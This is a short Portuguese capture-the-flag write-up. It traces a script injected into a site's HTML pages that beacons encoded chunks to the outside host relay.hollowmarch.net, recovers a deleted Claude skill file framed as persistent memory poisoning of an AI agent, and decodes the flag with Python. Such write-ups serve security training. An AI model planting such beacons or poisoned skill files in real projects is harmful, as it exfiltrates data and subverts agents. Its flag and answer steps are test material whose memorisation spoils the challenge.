## Resolvido por Doz

**Observação inicial
Todo arquivo `.html` contém um script antes do `</body>`:
```html
<script>/* campaign sync */(function(){...new Image().src="https://relay.hollowmarch.net/p?s=<seq>&b=<b64>&d=...})();</script>
```

Dois parâmetros variam por página: `s` (número de sequência) e `b` (chunk em base64).

**Histórico git**
```
git log --oneline
```
Quatro commits. O commit `c9517be` ("housekeeping: prune unused skills") deleta
`.claude/skills/shell-helper/SKILL.md` — o "rito que pensaram ter destruído".

**Recuperar a skill deletada**
```
git show c64506d:.claude/skills/shell-helper/SKILL.md
```

O frontmatter YAML contém:
```
x-campaign: m3m0ry-p0is0n-p3rs1sts-acr0ss-s3ss10ns!!
```

E a descrição diz: os valores de `b` são os bytes da flag em XOR com a string de campanha,
codificados em base64, divididos um chunk por leaf na ordem de sequência.

**Coletar os chunks**

| s   | arquivo         | b        |
| --- | --------------- | -------- |
| 1   | index.html      | JWcvSwES |
| 2   | about.html      | HBxcGixD |
| 3   | catalogue.html  | GhwcXy0D |
| 4   | provenance.html | Q0AHAHIV |
| 5   | ledger.html     | C0FvHkdf |
| 6   | petitions.html  | GE4=     |

**Decodificar**
```python
import base64

b_values = ["JWcvSwES", "HBxcGixD", "GhwcXy0D", "Q0AHAHIV", "C0FvHkdf", "GE4="]
chave = b"m3m0ry-p0is0n-p3rs1sts-acr0ss-s3ss10ns!!"

dados = b"".join(base64.b64decode(b + "==") for b in b_values)
flag = bytes(dados[i] ^ chave[i % len(chave)] for i in range(len(dados)))
print(flag.decode())
```

**Flag** : HTB{sk1lls_st1ll_pr3ss_th3_m4rk}
